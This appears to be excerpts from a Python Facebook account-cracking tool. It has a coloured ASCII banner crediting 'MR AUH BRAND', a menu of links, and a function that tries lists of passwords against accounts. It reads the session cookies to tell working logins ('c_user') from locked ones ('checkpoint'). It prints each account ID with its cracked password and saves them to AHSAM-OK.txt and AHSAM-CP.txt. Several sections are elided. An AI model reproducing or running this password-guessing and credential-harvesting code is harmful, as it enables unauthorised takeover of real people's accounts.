...
| $$  | $$| $$  | $$ \$$    $$| $$  | $$| $$  \$ | $$
 \$$   \$$ \$$   \$$  \$$$$$$  \$$   \$$ \$$      \$$                                                                                                                                                             
\x1b[1;97m====================================================== 
\033[1;37m[] Author        : \033[1;32mMR AUH BRAND 
\033[1;37m[] Github        : \033[1;32mMR-AUH404
...
\x1b[1;97m======================================================""" 
def lines():
	print('\33[1;37mTOOL IS MR AHSAM UL HAQ JOIYA')
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='3':
		os.system('xdg-open https://github.com/MR-AUH404/dump')
	if riaz1 =='4':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100000001930073&mibextid=ZbWKwL');ahsam()
	if riaz1 =='2':
		bangla()
	else:
...
def m1():
    ...
    print('Press Enter to Back');ahsam()
#
def m2():
    user=[]
    os.system('clear')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[AHSAM-OK] '+cid+'|'+ps+'\033[0;97m')
                open('AHSAM-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[AHSAM-CP] '+cid+' | '+ps+'\x1b[1;97m')
                open('AHSAM-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mMR.AHSAM\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
